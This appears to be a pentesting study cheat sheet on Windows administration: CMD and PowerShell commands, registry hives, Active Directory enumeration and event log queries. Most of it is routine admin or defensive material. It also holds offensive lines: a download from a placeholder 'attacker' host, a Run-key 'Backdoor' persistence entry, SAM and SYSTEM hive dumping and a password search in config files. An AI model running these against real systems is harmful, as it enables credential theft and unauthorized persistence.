# 🖥️ Windows System Administration

> **Scope:** Windows internals, PowerShell, Registry, and AD basics — essential for Windows exploitation and defense.

---

## 📋 Essential Commands (CMD)

```cmd
:: System info
systeminfo
hostname
whoami /all
net user
net localgroup administrators

:: Network
ipconfig /all
netstat -ano
route print
arp -a
nslookup domain.com

:: Processes & Services
tasklist /svc
taskkill /PID 1234 /F
sc query state= all
wmic service get name,pathname,startmode

:: File operations
dir /s /b C:\*.txt
type file.txt
findstr /si "password" *.txt *.ini *.config *.xml
icacls "C:\path\to\file"
```

---

## ⚡ PowerShell Essentials

### Navigation & Files
```powershell
Get-ChildItem -Recurse -Filter "*.txt"    # Find files
Get-Content file.txt                       # Read file
Select-String -Path *.log -Pattern "error" # Grep equivalent
Get-Acl "C:\path"                          # Check permissions
Copy-Item src dst                          # Copy
Move-Item src dst                          # Move
```

### System Information
```powershell
Get-ComputerInfo                           # Full system info
Get-Process                                # Running processes
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-NetTCPConnection                       # Open connections
Get-LocalUser                              # Local users
Get-LocalGroupMember Administrators        # Admin group members
```

### Network
```powershell
Test-NetConnection target -Port 80         # Test port
Resolve-DnsName domain.com                 # DNS lookup
Get-NetIPAddress                           # IP config
Get-NetRoute                               # Routing table
```

### Remote Execution
```powershell
# WinRM (port 5985)
Enter-PSSession -ComputerName target -Credential domain\user
Invoke-Command -ComputerName target -ScriptBlock { whoami }

# Enable WinRM
Enable-PSRemoting -Force
```

### Download Files
```powershell
# Download from web
Invoke-WebRequest -Uri http://attacker/file -OutFile file.exe
(New-Object Net.WebClient).DownloadFile('http://attacker/file','C:\temp\file.exe')

# Base64 encode/decode
[Convert]::ToBase64String([IO.File]::ReadAllBytes("file.exe"))
[IO.File]::WriteAllBytes("file.exe", [Convert]::FromBase64String($b64))
```

---

## 🏗️ Windows Registry

### Key Hives
| Hive | Contains | Pentest Relevance |
|------|----------|-------------------|
| HKLM\SAM | User accounts & hashes | Credential extraction |
| HKLM\SYSTEM | Boot config, services | Service exploitation |
| HKLM\SOFTWARE | Installed programs | Persistence (Run keys) |
| HKCU | Current user settings | User-specific persistence |

### Important Registry Paths
```
# Persistence (auto-run)
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Credentials
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon  (AutoLogon)
HKLM\SYSTEM\CurrentControlSet\Services\  (service accounts)

# Security settings
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer  (AlwaysInstallElevated)
HKLM\SYSTEM\CurrentControlSet\Control\Lsa  (credential protection)
```

### Registry Commands
```cmd
:: Query a key
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

:: Add persistence
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\shell.exe"

:: Export/Import
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

---

## 🏢 Active Directory Basics

### Structure
```
Forest (top-level container)
└── Domain (e.g., corp.local)
    ├── Organizational Units (OUs)
    │   ├── Users
    │   ├── Computers
    │   └── Groups
    ├── Group Policy Objects (GPOs)
    └── Domain Controllers (DCs)
```

### Key Concepts
| Concept | Description | Pentest Relevance |
|---------|-------------|-------------------|
| Domain Controller | Hosts AD DS, authenticates users | Primary target |
| NTDS.dit | AD database (all hashes) | DCSync target |
| KRBTGT | Kerberos service account | Golden Ticket |
| GPO | Policy enforcement | Lateral movement, persistence |
| SPN | Service Principal Name | Kerberoasting |
| Trust | Cross-domain access | Trust abuse |

### AD Enumeration Commands
```cmd
:: From a domain-joined machine
net user /domain
net group "Domain Admins" /domain
net group "Domain Controllers" /domain
nltest /dclist:domain.local
```

```powershell
# PowerShell AD module
Get-ADUser -Filter * -Properties *
Get-ADGroup -Filter * | Select-Object Name
Get-ADComputer -Filter * | Select-Object DNSHostName
Get-ADDomainController -Filter *
```

---

## 📊 Event Viewer (Key Logs)

| Log | Path | Contains |
|-----|------|----------|
| Security | Security.evtx | Logons, privilege use, audit |
| System | System.evtx | Services, drivers, shutdown |
| Application | Application.evtx | App errors, installations |
| PowerShell | PowerShell Operational | Script execution |
| Sysmon | Sysmon Operational | Enhanced process/network logging |

### Quick Event Viewer Commands
```powershell
# Recent failed logins
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625} -MaxEvents 20

# Recent successful logins
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -MaxEvents 20

# New services installed
Get-WinEvent -FilterHashtable @{LogName='System';ID=7045} -MaxEvents 10
```

---

## 💡 Pentest-Relevant Windows Knowledge

| Concept | Why It Matters |
|---------|---------------|
| SAM database | Local password hashes |
| LSASS process | Credentials in memory (Mimikatz) |
| Token privileges | SeImpersonate → Potato attacks |
| Services (unquoted paths) | Privilege escalation |
| Scheduled Tasks | Persistence, privesc |
| DLL search order | DLL hijacking |
| UAC | Bypass for admin execution |
| AMSI | PowerShell defense to bypass |
| AppLocker/WDAC | Execution restrictions to bypass |

---

## 🔗 Associated Tools
- [Metasploit](../../TOOLS/metasploit.md) - Windows exploitation
- [Hashcat](../../TOOLS/Hashcat.md) - Crack Windows hashes
